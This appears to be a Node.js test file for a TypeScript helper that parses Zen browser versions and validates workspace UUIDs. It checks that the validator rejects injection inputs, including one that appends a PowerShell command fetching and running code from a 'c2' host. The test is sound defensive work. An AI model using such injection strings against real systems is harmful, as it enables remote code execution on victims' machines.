const assert = require("node:assert/strict");
const { readFileSync } = require("node:fs");
const path = require("node:path");
const { test } = require("node:test");
const { runInNewContext } = require("node:vm");
const ts = require("typescript");

function loadModule() {
  const source = readFileSync(path.join(__dirname, "..", "src", "util", "zenApp.ts"), "utf8");
  const { outputText } = ts.transpileModule(source, {
    compilerOptions: { module: ts.ModuleKind.CommonJS, target: ts.ScriptTarget.ES2023, esModuleInterop: true },
  });
  const exports = {};
  runInNewContext(outputText, { exports, require, process });
  return exports;
}

const { parseZenVersion, versionAtLeast, isZenSpaceId } = loadModule();

test("parseZenVersion strips the channel suffix", () => {
  assert.deepEqual([...parseZenVersion("1.23.4b")], [1, 23, 4]);
  assert.deepEqual([...parseZenVersion("1.24t")], [1, 24]);
});

test("versionAtLeast compares component-wise against the --space minimum", () => {
  assert.equal(versionAtLeast(parseZenVersion("1.23.3b"), [1, 23, 3]), true);
  assert.equal(versionAtLeast(parseZenVersion("1.23.4b"), [1, 23, 3]), true);
  assert.equal(versionAtLeast(parseZenVersion("1.24b"), [1, 23, 3]), true);
  assert.equal(versionAtLeast(parseZenVersion("1.23.2b"), [1, 23, 3]), false);
  assert.equal(versionAtLeast(parseZenVersion("1.22.3b"), [1, 23, 3]), false);
});

test("isZenSpaceId accepts braced and bare UUIDs only", () => {
  assert.equal(isZenSpaceId("{0c34d9c4-f922-4785-b2b2-61f90f7f9798}"), true);
  assert.equal(isZenSpaceId("0C34D9C4-F922-4785-B2B2-61F90F7F9798"), true);
  assert.equal(isZenSpaceId("$(calc)"), false);
  assert.equal(isZenSpaceId("{0c34d9c4-f922-4785-b2b2-61f90f7f9798}'; iex(iwr('http://c2'))"), false);
  assert.equal(isZenSpaceId("--new-window"), false);
  assert.equal(isZenSpaceId(""), false);
  assert.equal(isZenSpaceId(undefined), false);
});
